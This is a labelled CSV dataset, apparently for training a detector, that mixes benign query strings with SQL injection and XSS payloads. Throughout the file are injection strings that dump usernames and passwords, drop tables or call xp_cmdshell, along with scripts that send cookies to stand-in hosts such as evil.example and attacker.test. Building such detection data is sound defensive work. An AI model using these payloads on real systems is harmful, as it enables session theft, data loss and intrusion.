payload,label
""" OR ""1""=""1",sqli
token=44f6d8c,benign
offset=7888&lang=id&session=19e13fc,benign
user_id=459&email=dashboard@example.com,benign
' OR '1'='1,sqli
' GROUP BY password HAVING 1=1 --,sqli
token=5804971&search=citra,benign
qty=7252&redirect=/home,benign
1 OR 1=1,sqli
1; EXEC xp_cmdshell('dir') --,sqli
email=invoice@example.com&limit=6023&theme=dark,benign
search=phone,benign
lang=en&format=json&ref=budi,benign
admin' --,sqli
' OR 1=1 --,sqli
city=orders&q=jakarta&ref=surakarta,benign
"""><script>alert(1)</script>",xss
currency=usd&offset=8249,benign
<script>eval(atob('YWxlcnQoMSk='))</script>,xss
tab=budi&sort=desc&user_id=3472,benign
search=echo&tab=book&color=budi,benign
<script>eval(atob('YWxlcnQoMSk='))</script>,xss
currency=usd&ref=profile,benign
theme=dark&search=orders,benign
lang=en&theme=dark,benign
limit=3322&sort=asc,benign
'><script>alert(1)</script>,xss
' GROUP BY password HAVING 1=1 --,sqli
""" OR ""1""=""1",sqli
' OR EXISTS(SELECT * FROM users) --,sqli
name=camera&lang=id&sort=desc,benign
q=budi,benign
format=json&ref=delta&callback=jakarta,benign
format=json&offset=7484&session=5641cfb,benign
' OR 1=1 --,sqli
<script>document.location='http://c2.example/'+document.cookie</script>,xss
<style>@import 'http://attacker.test/xss.css';</style>,xss
name=profile&coupon=orders&offset=7674,benign
coupon=profile&city=surakarta,benign
"<a href=""javascript:alert(1)"">click</a>",xss
offset=7260&category=echo&price_max=9886,benign
' OR 7=9 --,sqli
"' UNION SELECT NULL, NULL, NULL --",sqli
' AND (SELECT COUNT(*) FROM users) > 0 --,sqli
currency=usd&page=8543,benign
callback=budi,benign
redirect=/home&user_id=645,benign
lang=en&view=grid,benign
"' UNION SELECT username, password FROM users --",sqli
admin' --,sqli
redirect=/home&page=6883&currency=usd,benign
email=laptop@example.com&view=grid&token=260139d,benign
<img src=x onerror=this.src='http://evil.example/'+document.cookie>,xss
email=camera@example.com&name=delta,benign
<input onfocus=alert(1) autofocus>,xss
q=foxtrot&user_id=3942&session=4c8af2b,benign
<script>alert(document.cookie)</script>,xss
q=alice&lang=id&user_id=7802,benign
category=delta,benign
<body onload=alert('xss')>,xss
name=delta,benign
admin' --,sqli
tab=echo,benign
""" OR ""1""=""1",sqli
session=d4f7b6&view=grid&callback=surakarta,benign
<script>alert(document.cookie)</script>,xss
<input onfocus=alert(1) autofocus>,xss
theme=dark&size=m&redirect=/home,benign
<script>document.location='http://evil.example/'+document.cookie</script>,xss
<script>document.location='http://bad-host.example/'+document.cookie</script>,xss
<script>alert('xss')</script>,xss
<script>alert(document.cookie)</script>,xss
<script>eval(atob('YWxlcnQoMSk='))</script>,xss
<body onload=alert('xss')>,xss
<body onload=alert('xss')>,xss
q=report&price_max=6485,benign
session=4b9ac86&coupon=laptop,benign
<video><source onerror=alert(1)></video>,xss
'; DROP TABLE users; --,sqli
1 OR 1=1,sqli
' GROUP BY password HAVING 1=1 --,sqli
name=jakarta,benign
' OR EXISTS(SELECT * FROM users) --,sqli
callback=delta,benign
price_min=8738&format=json&currency=usd,benign
<marquee onstart=alert(1)>,xss
price_max=4107,benign
""" OR ""1""=""1",sqli
<script>document.location='http://evil.example/'+document.cookie</script>,xss
"""><script>alert(1)</script>",xss
redirect=/home&page=7797&qty=1971,benign
price_min=8606&price_max=1792&city=budget,benign
' OR 1=1#,sqli
callback=book&session=3da7908,benign
offset=2527,benign
ref=foxtrot&category=shoes&email=report@example.com,benign
tab=camera&format=json,benign
<style>@import 'http://evil.example/xss.css';</style>,xss
1' AND 1=1 --,sqli
price_min=8408&session=1c2d3c6,benign
search=jakarta&currency=usd,benign
' OR 6=4 --,sqli
1' AND 1=1 --,sqli
admin' --,sqli
1' AND 1=1 --,sqli
<script>alert(document.cookie)</script>,xss
1' AND 1=1 --,sqli
callback=settings,benign
offset=483&currency=usd&ref=phone,benign
callback=dashboard&sort=desc,benign
<body onload=alert('xss')>,xss
currency=usd&city=laptop&redirect=/home,benign
size=m&callback=echo,benign
1 OR 1=1,sqli
1; EXEC xp_cmdshell('dir') --,sqli
redirect=/home&session=55769a6,benign
<script>new Image().src='http://attacker.test/?c='+document.cookie;</script>,xss
'; DROP TABLE users; --,sqli
'; DROP TABLE users; --,sqli
tab=book&page=7719,benign
currency=usd&user_id=35,benign
' AND (SELECT COUNT(*) FROM users) > 0 --,sqli
page=2726,benign
' HAVING 1=1 --,sqli
size=m&theme=dark&redirect=/home,benign
<script>fetch('http://bad-host.example/steal?c='+document.cookie)</script>,xss
user_id=1944&id=2333&callback=surakarta,benign
<style>@import 'http://bad-host.example/xss.css';</style>,xss
<img src=x onerror=alert(1)>,xss
q=orders&ref=alice&color=invoice,benign
offset=9659&theme=dark,benign
q=jakarta&lang=en&coupon=citra,benign
<input onfocus=alert(1) autofocus>,xss
price_max=6619&coupon=delta&q=invoice,benign
redirect=/home&category=orders,benign
<style>@import 'http://evil.example/xss.css';</style>,xss
<script>eval(atob('YWxlcnQoMSk='))</script>,xss
size=m&price_max=3083,benign
<img src=x onerror=this.src='http://evil.example/'+document.cookie>,xss
' HAVING 1=1 --,sqli
currency=usd&city=dashboard&redirect=/home,benign
1' AND 1=1 --,sqli
session=12e133f&lang=id&city=profile,benign
1' AND 1=1 --,sqli
category=laptop,benign
ref=delta&color=budi&sort=asc,benign
<style>@import 'http://c2.example/xss.css';</style>,xss
id=9586&price_max=8373,benign
name=report&lang=id,benign
1 OR 1=1,sqli
limit=4353&color=jakarta&q=echo,benign
search=surakarta,benign
search=alice&page=8565&limit=5963,benign
<script>alert(document.cookie)</script>,xss
1; EXEC xp_cmdshell('dir') --,sqli
page=4521&ref=book,benign
lang=en&view=grid&sort=desc,benign
<script>new Image().src='http://evil.example/?c='+document.cookie;</script>,xss
token=37bd68e,benign
sort=asc,benign
') OR ('1'='1,sqli
<script>alert('xss')</script>,xss
"' UNION SELECT username, password FROM users --",sqli
city=camera&lang=en,benign
<img src=x onerror=alert(1)>,xss
<input onfocus=alert(1) autofocus>,xss
qty=5847&city=jakarta&format=json,benign
<iframe src=javascript:alert(1)>,xss
') OR ('1'='1,sqli
<video><source onerror=alert(1)></video>,xss
format=json&lang=id&coupon=surakarta,benign
sort=asc&tab=echo,benign
<script>alert(document.cookie)</script>,xss
page=2320,benign
redirect=/home&sort=desc&name=delta,benign
<iframe src=javascript:alert(1)>,xss
category=budi,benign
session=4efdb02,benign
q=camera,benign
sort=asc&city=settings,benign
' OR '1'='1,sqli
offset=7528&tab=book&page=4804,benign
' GROUP BY password HAVING 1=1 --,sqli
ref=laptop&size=m&lang=en,benign
id=4346&ref=delta,benign
' OR 1=1#,sqli
redirect=/home&price_min=9883&offset=8380,benign
city=citra&q=surakarta&search=book,benign
id=8939&email=budi@example.com&currency=usd,benign
' OR 1=1 --,sqli
tab=report,benign
sort=asc&price_max=9892,benign
city=report&price_min=9629&search=report,benign
city=delta&lang=en,benign
admin' --,sqli
<script>alert(document.cookie)</script>,xss
search=settings&price_max=3326,benign
qty=8038&callback=jakarta,benign
id=8741&email=delta@example.com&search=settings,benign
<script>document.location='http://bad-host.example/'+document.cookie</script>,xss
color=citra&currency=usd&price_min=7892,benign
<img src=x onerror=alert(1)>,xss
size=m&ref=orders&lang=en,benign
coupon=phone&sort=desc,benign
' AND (SELECT COUNT(*) FROM users) > 0 --,sqli
page=5842&token=17ef81e,benign
city=delta,benign
sort=asc&theme=dark,benign
' OR EXISTS(SELECT * FROM users) --,sqli
<img src=x onerror=alert(1)>,xss
search=phone&size=m&ref=book,benign
<input onfocus=alert(1) autofocus>,xss
ref=report&callback=surakarta&page=7202,benign
admin' --,sqli
"<a href=""javascript:alert(1)"">click</a>",xss
offset=4401&limit=2477,benign
price_max=853&format=json&size=m,benign
1 OR 8=2,sqli
lang=id&tab=shoes&city=dashboard,benign
view=grid&price_max=139,benign
format=json&sort=asc&city=echo,benign
<script>alert(document.cookie)</script>,xss
admin' --,sqli
' GROUP BY password HAVING 1=1 --,sqli
id=2348&search=book,benign
tab=alice&theme=dark,benign
<marquee onstart=alert(1)>,xss
page=4654,benign
lang=id&page=2578&email=camera@example.com,benign
theme=dark&ref=book&name=surakarta,benign
sort=asc&page=3674,benign
currency=usd&page=7114,benign
' GROUP BY password HAVING 1=1 --,sqli
"' UNION SELECT username, password FROM users --",sqli
id=1355&format=json&search=shoes,benign
<body onload=alert('xss')>,xss
1; EXEC xp_cmdshell('dir') --,sqli
format=json&tab=shoes,benign
<script>new Image().src='http://attacker.test/?c='+document.cookie;</script>,xss
ref=laptop&price_min=1478&category=echo,benign
theme=dark&q=book,benign
session=497b836,benign
<input onfocus=alert(1) autofocus>,xss
1; EXEC xp_cmdshell('dir') --,sqli
1; EXEC xp_cmdshell('dir') --,sqli
' OR 1=1 --,sqli
search=invoice&page=5833,benign
price_max=2878&page=2249&user_id=8134,benign
""" UNION SELECT table_name FROM information_schema.tables --",sqli
q=laptop,benign
""" OR ""1""=""1",sqli
' OR 'a'='a,sqli
""" UNION SELECT table_name FROM information_schema.tables --",sqli
limit=9623&coupon=phone&page=4050,benign
offset=8999,benign
callback=budget&qty=6391,benign
<svg onload=alert(1)>,xss
ref=delta&city=delta&name=camera,benign
email=foxtrot@example.com&price_min=4661,benign
city=shoes&q=shoes&session=5ee77af,benign
"' UNION SELECT username, password FROM users --",sqli
' OR 1=1 --,sqli
<script>eval(atob('YWxlcnQoMSk='))</script>,xss
price_min=8701&limit=3815&page=6772,benign
""" UNION SELECT table_name FROM information_schema.tables --",sqli
<marquee onstart=alert(1)>,xss
1 OR 1=1,sqli
1; EXEC xp_cmdshell('dir') --,sqli
callback=profile&currency=usd&q=settings,benign
coupon=budget&format=json&id=6446,benign
lang=id&view=grid&user_id=9056,benign
<input onfocus=alert(1) autofocus>,xss
"""><script>alert(1)</script>",xss
lang=en&session=f23e64,benign
qty=4976&email=shoes@example.com,benign
<svg onload=alert(1)>,xss
callback=phone,benign
<input onfocus=alert(1) autofocus>,xss
<script>document.location='http://evil.example/'+document.cookie</script>,xss
token=1228bfc&color=camera&city=budi,benign
' AND (SELECT COUNT(*) FROM users) > 0 --,sqli
<script>document.location='http://c2.example/'+document.cookie</script>,xss
'; DROP TABLE users; --,sqli
id=6732&search=phone&lang=en,benign
search=foxtrot,benign
<script>fetch('http://evil.example/steal?c='+document.cookie)</script>,xss
limit=7547,benign
"' UNION SELECT username, password FROM users --",sqli
<script>fetch('http://attacker.test/steal?c='+document.cookie)</script>,xss
price_max=1194&theme=dark,benign
qty=9069&id=2020,benign
<body onload=alert('xss')>,xss
limit=9824&theme=dark,benign
sort=asc&city=phone,benign
sort=desc&category=echo,benign
<div onmouseover=alert(1)>hover</div>,xss
1 OR 1=1,sqli
<script>new Image().src='http://bad-host.example/?c='+document.cookie;</script>,xss
coupon=profile,benign
' HAVING 1=1 --,sqli
'; DROP TABLE users; --,sqli
limit=2617&qty=5124,benign
color=delta&tab=delta&redirect=/home,benign
color=budget,benign
'; DROP TABLE users; --,sqli
id=3297,benign
redirect=/home&qty=4409&category=laptop,benign
<img src=x onerror=alert(1)>,xss
<img src=x onerror=this.src='http://bad-host.example/'+document.cookie>,xss
<body onload=alert('xss')>,xss
' OR 1=1 --,sqli
token=114b8ff&theme=dark,benign
page=7092&city=jakarta&coupon=phone,benign
coupon=invoice,benign
page=1195,benign
<marquee onstart=alert(1)>,xss
1; EXEC xp_cmdshell('dir') --,sqli
email=budget@example.com,benign
category=budi&user_id=2840&format=json,benign
' OR SLEEP(4)='0,sqli
<script>alert(document.cookie)</script>,xss
<div onmouseover=alert(1)>hover</div>,xss
<script>alert('xss')</script>,xss
ref=citra,benign
admin' --,sqli
' OR 1=1#,sqli
""" UNION SELECT table_name FROM information_schema.tables --",sqli
qty=8409,benign
1 OR 1=1,sqli
token=3e4c802,benign
sort=asc&qty=8126,benign
session=44c0cd8,benign
color=shoes&coupon=surakarta,benign
' OR 1=1 --,sqli
view=grid&offset=9945,benign
token=445f6c0&lang=en,benign
token=4edcc00,benign
offset=7885,benign
category=budget&format=json&sort=asc,benign
email=book@example.com&currency=usd,benign
qty=8173,benign
sort=desc&redirect=/home&sort=asc,benign
<script>fetch('http://evil.example/steal?c='+document.cookie)</script>,xss
<script>document.location='http://c2.example/'+document.cookie</script>,xss
size=m&email=echo@example.com,benign
limit=1164&price_min=1105&id=1161,benign
callback=alice,benign
<video><source onerror=alert(1)></video>,xss
email=jakarta@example.com&name=orders&ref=profile,benign
'><script>alert(1)</script>,xss
sort=desc&lang=id&sort=asc,benign
' OR '1'='1,sqli
theme=dark&city=report,benign
""" OR ""1""=""1",sqli
sort=desc&price_min=682&offset=3581,benign
redirect=/home&price_max=486&qty=8039,benign
id=3879&price_min=6732&email=shoes@example.com,benign
qty=6998,benign
tab=laptop&callback=report,benign
"' UNION SELECT username, password FROM users --",sqli
<video><source onerror=alert(1)></video>,xss
admin' --,sqli
<style>@import 'http://attacker.test/xss.css';</style>,xss
callback=echo&currency=usd&price_max=9450,benign
<script>document.location='http://c2.example/'+document.cookie</script>,xss
price_min=4617&view=grid&lang=en,benign
'><script>alert(1)</script>,xss
email=book@example.com&color=echo,benign
page=9205&price_min=9065,benign
tab=phone&page=6807,benign
' OR 'a'='a,sqli
<video><source onerror=alert(1)></video>,xss
name=dashboard,benign
user_id=5583&email=budi@example.com&token=487af52,benign
token=44bba02&currency=usd&theme=dark,benign
user_id=7122&category=shoes,benign
<details open ontoggle=alert(1)>,xss
currency=usd&limit=7957&email=report@example.com,benign
<script>new Image().src='http://evil.example/?c='+document.cookie;</script>,xss
1' AND SLEEP(3) --,sqli
page=8495&category=alice,benign
format=json&sort=asc,benign
lang=id&email=surakarta@example.com&sort=asc,benign
1; EXEC xp_cmdshell('dir') --,sqli
lang=en&color=delta&tab=settings,benign
sort=desc&format=json,benign
offset=2545,benign
1' AND SLEEP(3) --,sqli
lang=id&limit=5919,benign
<svg onload=alert(1)>,xss
name=profile&token=15e9771,benign
' OR EXISTS(SELECT * FROM users) --,sqli
<img src=x onerror=this.src='http://bad-host.example/'+document.cookie>,xss
<svg onload=alert(1)>,xss
sort=asc&search=foxtrot,benign
' OR SLEEP(5)='0,sqli
token=5c2464e,benign
' HAVING 1=1 --,sqli
color=invoice&ref=alice&offset=2742,benign
<video><source onerror=alert(1)></video>,xss
<marquee onstart=alert(1)>,xss
1 OR 1=1,sqli
'><script>alert(1)</script>,xss
name=citra&color=camera,benign
size=m&session=22179f5,benign
<iframe src=javascript:alert(1)>,xss
format=json&currency=usd,benign
"' UNION SELECT username, password FROM users --",sqli
limit=1270&offset=4452&token=1b3fa5c,benign
<div onmouseover=alert(1)>hover</div>,xss
<script>document.location='http://bad-host.example/'+document.cookie</script>,xss
price_min=1167&qty=8200&price_max=8681,benign
"<a href=""javascript:alert(1)"">click</a>",xss
search=invoice&city=orders&price_max=6756,benign
<video><source onerror=alert(1)></video>,xss
' OR SLEEP(5)='0,sqli
1 OR 1=1,sqli
coupon=budi&q=book&lang=en,benign
<img src=x onerror=alert(1)>,xss
' OR SLEEP(5)='0,sqli
<body onload=alert('xss')>,xss
ref=alice&email=book@example.com&tab=dashboard,benign
<marquee onstart=alert(1)>,xss
offset=9968,benign
color=budget&price_max=3681&lang=en,benign
lang=id&id=2370,benign
<div onmouseover=alert(1)>hover</div>,xss
' GROUP BY password HAVING 1=1 --,sqli
lang=id&format=json&sort=asc,benign
<svg onload=alert(1)>,xss
format=json&user_id=2914&size=m,benign
email=phone@example.com&coupon=citra&lang=en,benign
admin' --,sqli
lang=id&session=279180b,benign
"<a href=""javascript:alert(1)"">click</a>",xss
category=book&ref=citra&lang=en,benign
') OR ('1'='1,sqli
"' UNION SELECT username, password FROM users --",sqli
page=3922&tab=budget&currency=usd,benign
q=surakarta&token=17eb9a7&page=894,benign
' GROUP BY password HAVING 1=1 --,sqli
currency=usd&id=6165&qty=3362,benign
' OR 1=1#,sqli
<script>eval(atob('YWxlcnQoMSk='))</script>,xss
price_min=5897&coupon=surakarta&redirect=/home,benign
session=349eefb&lang=en&offset=1585,benign
1' AND SLEEP(5) --,sqli
<script>document.location='http://evil.example/'+document.cookie</script>,xss
ref=book&view=grid,benign
q=camera&size=m,benign
<script>document.location='http://bad-host.example/'+document.cookie</script>,xss
1; EXEC xp_cmdshell('dir') --,sqli
price_min=2142&page=4277&session=437d602,benign
<marquee onstart=alert(1)>,xss
<script>alert('xss')</script>,xss
<body onload=alert('xss')>,xss
""" OR ""1""=""1",sqli
"<a href=""javascript:alert(1)"">click</a>",xss
session=bf1a79,benign
id=6780&user_id=9168,benign
<details open ontoggle=alert(1)>,xss
email=echo@example.com&token=32e84b3&redirect=/home,benign
<svg onload=alert(1)>,xss
<script>fetch('http://evil.example/steal?c='+document.cookie)</script>,xss
<details open ontoggle=alert(1)>,xss
""" UNION SELECT table_name FROM information_schema.tables --",sqli
' GROUP BY password HAVING 1=1 --,sqli
' OR 1=1 --,sqli
ref=echo&coupon=shoes,benign
1 OR 1=1,sqli
sort=asc&coupon=dashboard,benign
ref=alice,benign
' OR 1=1#,sqli
admin' --,sqli
user_id=4106,benign
theme=dark&user_id=2755,benign
<img src=x onerror=this.src='http://evil.example/'+document.cookie>,xss
"<a href=""javascript:alert(1)"">click</a>",xss
""" OR ""1""=""1",sqli
<video><source onerror=alert(1)></video>,xss
token=11b92b5,benign
' OR '1'='1,sqli
' HAVING 1=4 --,sqli
<iframe src=javascript:alert(1)>,xss
<svg onload=alert(1)>,xss
<script>alert(document.cookie)</script>,xss
lang=en&redirect=/home&qty=816,benign
callback=delta&currency=usd&q=settings,benign
user_id=6333,benign
currency=usd,benign
<script>fetch('http://evil.example/steal?c='+document.cookie)</script>,xss
<script>alert('xss')</script>,xss
limit=8982&tab=delta&id=6468,benign
category=profile&qty=4891,benign
<video><source onerror=alert(1)></video>,xss
format=json&limit=7754,benign
<input onfocus=alert(1) autofocus>,xss
page=3840&ref=phone&token=534763c,benign
ref=budi&lang=id&view=grid,benign
format=json&size=m&ref=phone,benign
color=shoes&name=alice&user_id=3305,benign
"""><script>alert(1)</script>",xss
format=json&lang=id&theme=dark,benign
user_id=1074&price_min=5532&sort=asc,benign
' HAVING 1=1 --,sqli
sort=desc&city=laptop,benign
view=grid&format=json,benign
q=jakarta&email=phone@example.com&tab=delta,benign
page=4287&sort=asc,benign
